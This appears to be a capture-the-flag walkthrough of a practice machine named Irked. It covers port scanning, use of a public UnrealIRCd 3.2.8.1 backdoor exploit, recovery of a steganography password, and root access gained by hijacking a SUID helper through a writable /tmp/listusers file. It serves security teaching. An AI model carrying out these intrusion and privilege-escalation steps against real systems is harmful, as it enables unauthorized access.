1, Recon
port scan 
```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38453/udp6  status
|   100024  1          50987/tcp   status
|   100024  1          53651/udp   status
|_  100024  1          56239/tcp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
50987/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd

```

From port 80, we could not find anything useful.
![](images/Pasted%20image%2020241127023209.png)
There is a hint: IRC is working.
```
IRC
IRC（英语：Internet Relay Chat，直译：因特网中继聊天）是一种应用层的协议。其主要用于群体聊天，但同样也可以用于个人对个人的聊天。IRC使用的服务器端口有6667（明文传输，如irc://irc.libera.chat）、6697（SSL加密传输，如ircs://irc.libera.chat:6697）等。
```
We can use `HexChat` or `irssi` to check what is going on here.
`irssi -c 10.10.10.117 -p 6697`
```
Your host is irked.htb, running version Unreal3.2.8.1
02:42 -!- This server was created Mon May 14 2018 at 13:12:50 EDT
02:42 -!- irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp 
          lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
```
We get the version of `Unreal 3.2.8.1`
By searching that exploits ,we found `UnrealIRCd 3.2.8.1 Backdoor`
`https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor.git`

Just change the script and run it, then we can get the shell as ircd

2, shell as `djmardov`
when I come to `/home/djmardov`, I want to check the `user.txt`, but we did not have the permission to open it.
So we would enumerate more deeply, we found a hidden file `.backup`
```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

When I see the `steg` , I would use the tool `steghide`.
And I only have the image of index page to crack, so I would try it.
`steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss`
```
extract - I want to extract data
-sf irked.jpg - give the file to extract from
-p - passphrase
```
We get the password `Kab6h+m+bbp2J:HG`

Then we can use ssh to login.

3, shell as root
when I want to check `sudo -l`, I find there is no command `sudo`

So I continue to check `id` to find something useful
`uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)`

Still no hints, so we can try to use `linpeas.sh` to check the vulnerablilty.

From the files `/bin` with root permission.
I don’t recognize the file `/usr/bin/viewuser`.
```
djmardov@irked:/dev/shm$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2019-04-03 06:34 (:0)
djmardov pts/2        2019-04-04 09:01 (10.10.14.14)
sh: 1: /tmp/listusers: not found
```

It throws an error saying that sh can’t find `/tmp/listusers`.

```
djmardov@irked:~$ echo "test" > /tmp/listusers

djmardov@irked:~$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2018-11-20 11:57 (:0)
djmardov pts/0        2018-11-20 11:58 (10.10.14.14)
djmardov pts/1        2018-11-20 12:36 (10.10.14.14)
sh: 1: /tmp/listusers: Permission denied

```

Permissions - the only thing that root can’t do is execute. So I’ll add it, and change it to a command:
```
djmardov@irked:~$ chmod +x /tmp/listusers 
djmardov@irked:~$ echo id > /tmp/listusers 
djmardov@irked:~$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2018-11-20 11:57 (:0)
djmardov pts/0        2018-11-20 11:58 (10.10.14.14)
djmardov pts/1        2018-11-20 12:36 (10.10.14.14)
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

There’s execution. I’ll change the command to get a shell:
```
djmardov@irked:~$ echo sh > /tmp/listusers 
djmardov@irked:~$ viewuser 
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2018-11-20 11:57 (:0)
djmardov pts/0        2018-11-20 11:58 (10.10.14.14)
djmardov pts/1        2018-11-20 12:36 (10.10.14.14)
# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

Then we finally get shell as root.

